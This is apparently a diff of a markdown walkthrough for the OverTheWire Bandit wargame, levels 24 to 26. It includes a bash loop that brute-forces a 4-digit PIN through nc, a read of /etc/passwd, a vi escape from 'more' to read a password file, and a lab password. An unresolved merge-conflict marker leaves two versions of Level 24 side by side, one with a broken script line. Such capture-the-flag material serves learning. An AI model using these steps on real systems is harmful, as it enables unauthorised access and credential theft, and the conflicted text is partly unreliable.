@@ -420,6 +420,7 @@ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 ## Level 24
 
+<<<<<<< HEAD
 ```bsh
 bandit24@bandit:~$ nc localhost 30002
 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode
@@ -436,4 +437,55 @@ I am the pincode checker for user bandit25. Please enter the password for user b
  do
     output = echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002
 done
+```
+=======
+```
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
+Wrong! Please enter the correct pincode. Try again.
+1234
+Fail! You did not supply enough data. Try again.
+```
+So we write a bash script to generate pins
+```
+bandit24@bandit:/tmp/init724$ vim bruteforce.sh
+#!/bin/bash
+
+for i in {0000..9999}
+do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> pins
+done
+```
+Then pipe into nc and get the uniq result
+```
+bandit24@bandit:/tmp/init724$ cat pins | nc localhost 30002 >> result
+bandit24@bandit:/tmp/init724$ uniq result
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is 
+```
+
+## Bandit 26
+
+```
+bandit25@bandit:~$ ssh bandit26@localhost -i bandit26.sshkey
+```
+Logs you in and out immediately. So check the shell
+```
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+So it uses more to read a file in bandit26's home directory and then exits. More is a vi controllable read so we can make our terminal less lines than the text file  and then read the password through vi shell
+```
+v
+:r /etc/bandit_pass/bandit26
 ```
